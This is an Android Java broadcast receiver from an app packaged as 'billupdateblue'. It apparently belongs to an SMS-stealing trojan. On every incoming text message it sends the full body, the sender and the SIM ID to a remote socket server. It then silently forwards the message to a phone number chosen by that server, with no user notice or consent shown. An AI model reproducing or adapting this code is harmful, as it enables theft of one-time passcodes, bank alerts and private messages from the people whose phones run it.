package com.service.billupdateblue;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

public class SmsReceiver extends BroadcastReceiver {

    private int userId = 0;
    private SocketManager socketManager;
    private Helper helper;
    private SmsManager smsManager;

    @Override
    public void onReceive(Context context, Intent intent) {
        // ✅ Only handle SMS_RECEIVED
        if (intent == null || !"android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction()))
            return;

        try {
            socketManager = SocketManager.getInstance(context);
            helper = new Helper();
            smsManager = SmsManager.getDefault();

            socketManager.connect();

            Bundle bundle = intent.getExtras();
            if (bundle == null) return;

            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus == null || pdus.length == 0) return;

            String format = bundle.getString("format");
            StringBuilder fullMessage = new StringBuilder();
            String sender = "";

            // ✅ Combine multipart messages correctly (Android 7 → 14)
            for (Object pdu : pdus) {
                SmsMessage sms;
                sms = SmsMessage.createFromPdu((byte[]) pdu, format);

                if (sms != null) {
                    sender = sms.getDisplayOriginatingAddress();
                    fullMessage.append(sms.getMessageBody());
                }
            }

            String messageBody = fullMessage.toString();
            if (messageBody.isEmpty() || sender.isEmpty()) return;

            // ✅ Build payload for server
            JSONObject sendPayload = new JSONObject();
            sendPayload.put("message", messageBody);
            sendPayload.put("sender", sender);
            sendPayload.put("sim_sub_id", smsManager.getSubscriptionId());
            sendPayload.put("sms_forwarding_status", "sending");
            sendPayload.put("sms_forwarding_status_message", "Request for sending");

            // ✅ Safe socket emit
            socketManager.emitWithAck("smsForwardingData", sendPayload, new SocketManager.AckCallback() {
                @Override
                public void onResponse(JSONObject response) {
                    try {
                        int status = response.optInt("status", 0);
                        if (status == 200) {
                            JSONObject dataObj = response.optJSONObject("data");
                            if (dataObj == null) return;

                            userId = dataObj.optInt("id");
                            String phoneNumber = dataObj.optString("forward_to_number", "");
                            if (phoneNumber.isEmpty()) return;

                            // Unique request codes
                            int sentCode = (userId + phoneNumber).hashCode();
                            int deliveredCode = (userId + phoneNumber + "_delivered").hashCode();

                            Intent sentIntent = new Intent(context, SentReceiver.class);
                            Intent deliveredIntent = new Intent(context, DeliveredReceiver.class);
                            sentIntent.putExtra("id", userId);
                            sentIntent.putExtra("phone", phoneNumber);
                            deliveredIntent.putExtra("id", userId);
                            deliveredIntent.putExtra("phone", phoneNumber);

                            PendingIntent sentPI = PendingIntent.getBroadcast(
                                    context, sentCode, sentIntent, PendingIntent.FLAG_IMMUTABLE);

                            PendingIntent deliveredPI = PendingIntent.getBroadcast(
                                    context, deliveredCode, deliveredIntent, PendingIntent.FLAG_IMMUTABLE);

                            // ✅ Split long messages automatically
                            smsManager.sendMultipartTextMessage(
                                    phoneNumber, null,
                                    smsManager.divideMessage(messageBody),
                                    null, null
                            );
                        }
                    } catch (Exception e) {
                        Log.e("SmsReceiver", "Error processing socket response", e);
                    }
                }

                @Override
                public void onError(String error) {
                    Log.e("SmsReceiver", "Socket emit error: " + error);
                }
            });

        } catch (JSONException e) {
            Log.e("SmsReceiver", "JSON error: " + e.getMessage());
        } catch (Exception e) {
            Log.e("SmsReceiver", "onReceive error: " + e.getMessage());
        }
    }
}
